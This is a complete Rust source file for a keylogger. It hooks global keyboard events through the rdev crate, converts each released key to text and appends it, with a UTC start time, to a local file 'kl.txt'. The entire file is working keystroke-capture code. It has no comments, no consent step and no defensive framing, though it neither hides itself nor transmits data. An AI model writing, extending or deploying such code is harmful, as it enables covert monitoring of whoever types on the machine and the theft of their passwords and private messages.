use std::{
    fs::{File, OpenOptions},
    io::Write,
    path::Path, time::SystemTime,
};

use chrono::{DateTime, Utc};
use rdev::{listen, Event, EventType};

fn main() {
    let log_path = Path::new("kl.txt");

    let mut log_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path)
        .expect("Failed to open or create log file");

    let sys_time = SystemTime::now();
    let sys_time: DateTime<Utc> = sys_time.into();
    let sys_time = format!("\nStarted at: {} (UTC)\n", sys_time.format("%d/%m/%Y %T"));
    log(sys_time.as_str(), &mut log_file);

    if let Err(error) = listen(move |event| callback(event, &mut log_file)) {
        println!("Error: {:?}", error)
    }

    fn callback(event: Event, log_file: &mut File) {
        match event.event_type {
            EventType::KeyRelease(key) => {
                let mut key_str = format!("{:?}", key);

                match key_str {
                    _ if key_str.starts_with("Key") => {
                        key_str = key_str.replace("Key", "").to_lowercase()
                    }
                    _ if key_str.eq_ignore_ascii_case("Space") => key_str = " ".to_string(),
                    _ if key_str.starts_with("Num") => key_str = key_str.replace("Num", ""),
                    _ => key_str = format!("[{}] ", key_str),
                }

                log(&key_str, log_file)
            }
            _ => {}
        }
    }
}

fn log(str: &str, log_file: &mut File) {
    log_file
        .write_all(str.as_bytes())
        .expect("Failed to write key log to file.")
}
